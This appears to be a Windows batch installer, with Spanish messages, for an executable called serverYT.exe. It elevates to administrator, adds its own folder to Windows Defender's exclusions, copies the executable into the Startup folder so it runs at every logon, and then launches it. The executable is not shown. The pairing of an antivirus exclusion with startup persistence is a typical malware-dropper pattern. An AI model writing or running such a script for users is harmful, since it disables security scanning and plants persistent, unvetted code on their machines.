@echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Solicitando privilegios de administrador...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

setlocal

set "DIR=%~dp0"
set "SOURCE=%DIR%serverYT.exe"
set "ICON=%DIR%icono.ico"

set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "START_MENU_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs"

:: ⚠️ Agregar exclusión a Defender
echo Agregando exclusión a Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%DIR%'"

echo Creando acceso directo en el menú de inicio...
powershell -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%START_MENU_FOLDER%\\serverYT.lnk'); $s.TargetPath='%SOURCE%'; $s.IconLocation='%ICON%'; $s.Save()"

echo Copiando serverYT.exe a la carpeta de inicio...
copy /Y "%SOURCE%" "%STARTUP_FOLDER%\serverYT.exe"

echo Instalación completada con icono personalizado.
start "" "%STARTUP_FOLDER%\serverYT.exe"

powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Instalacion completada exitosamente!', 'Instalacion', 'OK', 'Information')"
